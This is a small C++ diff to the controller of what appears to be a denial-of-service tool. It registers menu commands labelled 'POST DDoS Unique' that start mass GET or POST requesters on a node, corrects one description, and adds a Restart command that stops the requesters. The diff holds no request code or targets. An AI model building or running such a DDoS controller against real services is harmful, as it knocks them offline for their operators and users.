@@ -61,8 +61,12 @@ int main() {
         nodes.SingleMassGet();
     });
 
-    user.RegisterFunction("POST DDoS Unique", "Sets up massive GET requester on a single node", [&]() {
+    user.RegisterFunction("POST DDoS Unique", "Sets up massive POST requester on a single node", [&]() {
         nodes.SingleMassPost();
+    });
+
+    user.RegisterFunction("Restart", "Stops all the requesters and threads", [&]() {
+        nodes.Restart();
     });
 
     user.Welcome("the Node Controller");
